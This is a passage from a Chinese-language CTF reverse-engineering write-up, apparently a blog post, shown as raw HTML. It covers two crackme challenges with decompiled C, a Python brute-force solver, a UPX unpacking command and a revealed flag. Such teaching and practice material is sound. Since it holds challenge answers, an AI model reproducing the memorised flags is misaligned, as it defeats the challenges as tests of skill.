punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到只是一个简单的算法，直接得脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringv12 <span class="token operator">=</span> <span class="token string">'Qsw3sj_lz4_Ujw@l'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>  <span class="token comment"># ascii表上有127个字符，一个一个试吧</span>        j <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        x <span class="token operator">=</span> j        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的这里</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。</p><p>这里我们把<code>*((char *)v1 + *(_DWORD *)&amp;v12[17])</code>这个整体看作<code>ord(j)</code>了，在逆向中，我们也常常这样将一个整体当成一个变量对待。</p><h3 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h3><p><strong>TAG:Z3脚本、UPX脱壳</strong></p><p>先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132422766.png" alt></p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\re<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用上方的命令脱一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132642504.png" alt></p><p>对上方的关键的字符串进行一下跟踪，追到下面的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_400E28</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er8</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40F950</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"input your flag:"</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40FA80</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v12 <span class="token punctuation">)</span>    <span class="token function">sub_443550</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再追踪一下<code>sub_4009AE</code>这个函数，发现里面的C代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> <span class="token operator">*</span>a1 <span class="token operator">!=</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 